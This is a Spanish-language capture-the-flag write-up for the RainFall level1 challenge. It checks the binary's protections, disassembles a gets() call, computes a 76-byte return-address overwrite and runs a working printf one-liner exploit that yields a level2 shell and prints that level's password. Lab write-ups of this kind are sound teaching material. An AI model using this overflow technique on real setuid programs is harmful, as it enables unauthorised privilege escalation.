# 1. Buscar Binario:

Listamos los archivos para que nos muestre el binario del 'level1' y sus permisos. 

```
level1@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
```

> **Nota:** El bit `s` en los permisos indica que es un binario **SUID**. Se ejecutará con los privilegios del propietario (`level2`).

---

# 2. Analizamos las protecciones de la RAM

### a). PIE;
```
level1@RainFall:~$ file ./level1 
./level1: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x099e580e4b9d2f1ea30ee82a22229942b231f2e0, not stripped
```

### b). ASLR:
```
level1@RainFall:~$ cat /proc/sys/kernel/randomize_va_space 
0
```

### c). NX y RELRO:
```
level1@RainFall:~$ readelf -l ./level1 | grep -E "STACK|RELRO"
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4

```

### d). STACK CANARY:
```
level1@RainFall:~$ nm ./level1 
bash: /usr/bin/nm: Input/output error
```

### e). `.got` y `.plt`:
```
level1@RainFall:~$ readelf -S ./level1 | grep -E ".got|.plt"
  [10] .rel.plt          REL             080482d0 0002d0 000028 08   A  5  12  4
  [12] .plt              PROGBITS        08048330 000330 000060 04  AX  0   0 16
  [22] .got              PROGBITS        08049788 000788 000004 04  WA  0   0  4
  [23] .got.plt          PROGBITS        0804978c 00078c 000020 04  WA  0   0  4
```

---

# 3. Resumen del análisis:

| Protección | Estado | Evidencia | Consecuencias |
| --- | --- | --- | --- |
| **PIE** | **OFF** | `executable` | El binario siempre carga en `0x08048000` |
| **ASLR** | **OFF** | `0` | Las direcciones de librerías y stack son constantes. |
| **NX** | **OFF** | `GNU_STACK RWE` | Si podemos ejecutar código (ShellCode) en el Stack |
| **RELRO** | **OFF** | `No RELRO ` | La tabla GOT puede ser sobrescrita. |
| **CANARY** | **? ? ?**  | `error` | Buscar con `gdb` |
| **.got.plt** | **WA**  | `WA` | Confirma sección `.got` en escritura |

---

# 4. Fuzzing:

Introducimos cadenas de caracteres para probar si el programa rompe:

```
level1@RainFall:~$ ./level1 

level1@RainFall:~$ ./level1 
1111111111111111111111111111111
level1@RainFall:~$ ./level1 
111111111111111111111111111111111111111111111111111111111111111111111111111111111
Segmentation fault (core dumped)

```

* El binairo `level1` genera un error de `segfault` cuando recibe por el `stdin` a patir de cierto numero de bytes.

# 5. Reverse Engineering (Target Identification):

Entramos en GDB para entender la lógica interna y encontrar la vulnerabilidad o la "puerta trasera".

```
level1@RainFall:~$ gdb ./level1 
(gdb) set disassembly-flavor intel
(gdb) disas main

Dump of assembler code for function main:
   0x08048480 <+0>:     push   ebp
   0x08048481 <+1>:	    mov    ebp,esp
   0x08048483 <+3>:	    and    esp,0xfffffff0
   0x08048486 <+6>:	    sub    esp,0x50
   0x08048489 <+9>:	    lea    eax,[esp+0x10]
   0x0804848d <+13>:	  mov    DWORD PTR [esp],eax
   0x08048490 <+16>:	  call   0x8048340 <gets@plt>
   0x08048495 <+21>:	  leave  
   0x08048496 <+22>:	  ret    
End of assembler dump.

```
Para ver con detalle el analisis consuta el archivo  [asm_analysis.md](https://github.com/4trastos/Rainfall/blob/main/level1/Resources/README.md) en conjunto con el programa de demostración  [source.c](https://github.com/4trastos/Rainfall/blob/main/level1/source.c).

---

# 6. Solución:

1. Tras analizar el desensamblado en el punto anterior, identificamos un posible desbordamiento del stack:

```asm
0x08048486 <+6>:	    sub    esp,0x50
0x08048490 <+16>:	    call   0x8048340 <gets@plt>
```
- Reserva 80 bytes (buffer)
- **gets():** Lee una línea desde la entrada estándar (`stdin`) al búfer y no comprueba su tamaño.
- Podriamos hacer shellcode

2. **Identificamos el BACKDOOR**
Al listar las funciones en GDB (`info functions`), localizamos una función que no es llamada en ninguna parte del código:

```
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets                      ⟸
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini

```

* **Objetivo:** Desviar el flujo de ejecución (EIP) hacia la dirección `0x08048444`.
```
0x08048444  run
```

3. **Cáculo del PAyload (OFFSET):**
Para tomar el control del EIP, debemos llenar el stack hasta alcanzar la dirección de retorno:

1. **Buffer útil:** 64 bytes (hasta el final de la reserva local).
2. **Padding/Alineación:** El compilador deja un hueco de 12 bytes adicionales en este caso específico entre el buffer y el EBP.
3. **EBP Viejo:** 4 bytes.
4. **EIP (Retorno):** Aquí inyectamos nuestra dirección.

4. **Cálculo total de caracteres basura (Padding):**
bytes.

| Offset | Contenido | Valor |
| --- | --- | --- |
| **0 - 75** | Basura | "A" * 76 |
| **76 - 79** | **Nuevo EIP** | `\x44\x84\x04\x08` (Dirección de `run` en Little Endian) |

5. **Análisis de protecciones:**

* **NX: OFF** -> Podríamos usar Shellcode, pero el backdoor `run` es más directo.
* **ASLR: OFF** -> La dirección `0x08048444` es estática y no cambia.

6. **Ejecución del Exploit:**
Usamos las shell enviar los bytes exactos incluyendo la dirección de la función `run` invertida (Little Endian):

```bash
level1@RainFall:~$ (printf 'A%.0s' {1..76}; printf '\x44\x84\x04\x08'; cat) | ./level1 
id
Good... Wait what?
whoami
level2
pwd  
/home/user/level1
cd ..
cd level2
pwd
/home/user/level2
ls -la
total 17
dr-xr-x---+ 1 level2 level2   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level2 level2  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level2 level2 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2
-rw-r--r--+ 1 level2 level2   65 Sep 23  2015 .pass
-rw-r--r--  1 level2 level2  675 Apr  3  2012 .profile
cat .pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
^C
Segmentation fault (core dumped)
level1@RainFall:~$ su level2
Password: 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level2/level2
level2@RainFall:~$ 

```

# 7. Conclusión:

El nivel 1 introduce el **Buffer Overflow** clásico mediante el uso de la función insegura gets(). Al no existir protecciones como **Stack Canaries** o **ASLR**, el desbordamiento permite sobrescribir la dirección de retorno en el stack para saltar a una función privilegiada (run) existente en el binario.

---